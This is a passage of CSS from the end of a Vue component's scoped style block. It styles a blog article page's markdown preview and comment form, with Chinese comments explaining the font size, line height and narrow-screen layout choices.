.cm-mine-title { color: var(--muted); font-size: 12px; margin-bottom: 6px; }

/* ===== md-editor-v3 预览区暗色适配 =====
   和后台编辑器用同一套主题变量，保证文章在"后台预览"和"前台阅读"里长得一样。 */
:deep(.md-editor-dark),
:deep(.md-editor-light) {
  --md-bk-color: transparent;
  --md-color: var(--ink);
  --md-border-color: var(--line);
  --md-hover-color: var(--accent);
  --md-scrollbar-bg-color: transparent;
  --md-scrollbar-thumb-color: var(--line);
}
/* 正文排版。
   【为什么正文是 16px / 1.9】站长反馈"详情页有点小"。正文是这一页的主角，
   15px 在 960px 的栏宽里显得单薄；16px 是中文长文阅读的常见下限，
   行高跟着提到 1.9（中文没有西文的词间空白，行距太小会糊成一片）。 */
:deep(.md-editor-preview) { background: transparent; font-size: 16px; line-height: 1.9; }
:deep(.md-editor-preview h1),
:deep(.md-editor-preview h2),
:deep(.md-editor-preview h3) { color: var(--ink); }
/* 全站 html 已有 76px 的滚动留白，再加 12px 让标题落在导航栏下方。 */
:deep(.md-editor-preview :is(h1, h2, h3, h4, h5, h6)) { scroll-margin-top: 12px; }
:deep(.md-editor-preview a) { color: var(--accent); }
:deep(.md-editor-preview code) { color: #8be9fd; }
:deep(.md-editor-preview blockquote) {
  border-left: 3px solid var(--accent);
  background: rgba(242,193,78,.06);
  color: var(--muted);
}

/* 窄屏：减小内边距，标题降字号 */
@media (max-width: 720px) {
  .art-wrap { padding: 20px 16px 48px; }
  .doc { padding: 26px 20px 32px; }
  .doc-title { font-size: 24px; }
  /* 昵称与邮箱在窄屏改成上下排：两栏挤在 320px 里每个只有 140px，字都显示不全 */
  .cm { padding: 22px 18px 26px; }
  .cm-fields { grid-template-columns: 1fr; }
}
</style>
